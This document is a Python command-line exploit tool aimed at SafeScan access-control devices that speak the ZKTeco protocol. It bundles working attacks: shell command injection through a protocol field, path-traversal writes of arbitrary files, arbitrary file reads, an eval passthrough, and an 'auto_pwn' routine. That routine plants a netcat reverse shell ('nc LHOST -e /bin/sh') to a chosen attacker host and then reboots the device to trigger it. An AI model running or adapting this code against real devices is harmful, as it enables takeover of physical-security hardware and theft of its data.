#!/usr/bin/env python

import cmd
import traceback
import pyzk.pyzk as pyzk
import pyzk.zkmodules.defs as defs
from pyzk.misc import *
import time

class SafeScan(cmd.Cmd):
    """Simple command prompt for SafeScan devices"""
    host = ''
    z = pyzk.ZKSS()

    def do_connect(self, line):
        try:
            self.z.connect_net(self.host, 4370)
            self.z.disable_device()
            print("Connected to {}".format(self.host))
        except:
            print("Error: connection")

    def do_write_lcd(self, line):
        """Write to the LCD screen"""
        try:
            payload = bytearray()
            line += '\x00\x00'
            message = bytearray([0x00]*50)
            message[0:10] = 'aaaaaaaaaa'.encode()
            payload.extend(struct.pack('<bbb10s', 0,0,0, message[0:10]))
            # payload.extend(line.encode())
            self.z.send_command(defs.CMD_WRITE_LCD, payload)
            self.z.recv_reply()
            print(self.z.last_payload_data.decode('ascii'))
            print(self.z.last_reply_code)
        except Exception:
            traceback.print_exc()

    def do_eval(self, line):
        try:
            command = "self.z." + line
            print("Executing: {}".format(command))
            print(eval(command))
        except Exception:
            print("Error: eval")
            traceback.print_exc()

    def do_get(self, line):
        try:
            print(self.z.get_device_info(line))
        except Exception:
            print("Error: eval")
            traceback.print_exc()

    def do_set(self, line):
        try:
            args = line.split(' ')
            param = args[0]
            value = args[1]
            print(self.z.set_device_info(param, value))
        except Exception:
            traceback.print_exc()

    def do_EOF(self, line):
        try:
            self.z.enable_device()
            self.z.disconnect()
        except Exception:
            traceback.print_exc()
        finally:
            return True

    def do_command_exec(self, line):
        if not len(line):
            print("[*] Usage: command_exec <cmd>\n[*] Output will not be returned, but you could write to a file and get it afterwards\n")
            return True
        try:
            # prepare data
            self.z.send_command(1500, struct.pack('<II', 1, 1))
            self.z.recv_reply()

            # send data
            self.z.send_command(1501, 'a'.encode())
            self.z.recv_reply()

            # apply data
            data = bytearray()
            data.extend(struct.pack('<I', 1700))
            payload = '; ' + line + '; echo \x00\x00'
            data.extend(payload.encode())
            self.z.send_command(110, data)
            self.z.recv_reply()

        except Exception:
            traceback.print_exc()


    def do_write_file(self, line):
        if not len(line) or len(line.split(' ')) != 2:
            print("[*] Usage: do_exploit_moto <file> <dest>")
            return True
        file = line.split(' ')[0]
        dest = line.split(' ')[1]

        if dest[0] != '/':
            dest = '/' + dest

        dest_final = "../../.." + dest + '\x00\x00\x00'

        try:
            print("[-] Creating {}".format(file))
            with open(file, 'r') as fp:
                payload = fp.read()

            # prepare data
            self.z.send_command(1500, struct.pack('<II', len(payload), len(payload)))
            self.z.recv_reply()

            # send data
            self.z.send_command(1501, payload.encode())
            self.z.recv_reply()

            # apply data
            data = bytearray()
            data.extend(struct.pack('<I', 1700))
            data.extend(dest_final.encode())
            self.z.send_command(110, data)
            self.z.recv_reply()

        except Exception:
            traceback.print_exc()

    def do_auto_pwn_ta(self, line):
        if not len(line) or len(line.split(':')) != 2:
            print("[*] Usage: write_file_pwn <LHOST:LPORT>")
            return True
        try:
            print("[-] Creating test.sh")
            payload = "(sleep 60 && nc {} -e /bin/sh)&".format(line)
            filename = "test.sh\x00"

            # prepare data
            print("[-] Preparing payload")
            self.z.send_command(1500, struct.pack('<II', len(payload), len(payload)))
            self.z.recv_reply()

            # send data
            print("[-] Sending payload")
            self.z.send_command(1501, payload.encode())
            self.z.recv_reply()

            # apply data
            print("[-] Saving payload")
            data = bytearray()
            data.extend(struct.pack('<I', 1700))
            data.extend(filename.encode())
            self.z.send_command(110, data)
            self.z.recv_reply()

            time.sleep(1)

            print("[-] Sending reboot command")
            self.z.restart()
            print("[+] Done. Device will reboot now.\nTo catch shell: nc -nlvp {}".format(line.split(':')[1]))

        except Exception:
            traceback.print_exc()

    def do_get_file(self, line):
        file = line.split(' ')[0]
        save_as = None
        if len(line.split(' ')) > 1:
            save_as = line.split(' ')[1]
        try:
            self.z.send_command(1702, str.encode(file + '\x00'))
            self.z.recv_long_reply()
            if save_as and len(self.z.last_payload_data.decode()):
                with open(save_as, 'w') as fp:
                    fp.write(self.z.last_payload_data.decode())
                print("Saved as {}".format(save_as))
            else:
                print(self.z.last_payload_data.decode())
        except Exception:
            traceback.print_exc()

if __name__ == '__main__':
    import sys
    if len(sys.argv) > 1:
        host = sys.argv[1]
        try:
            s = SafeScan()
            s.host = host
            s.onecmd('connect')
            s.cmdloop()
        except:
            print("Error")
    else:
        print("Usage: {} <host>".format(sys.argv[0]))
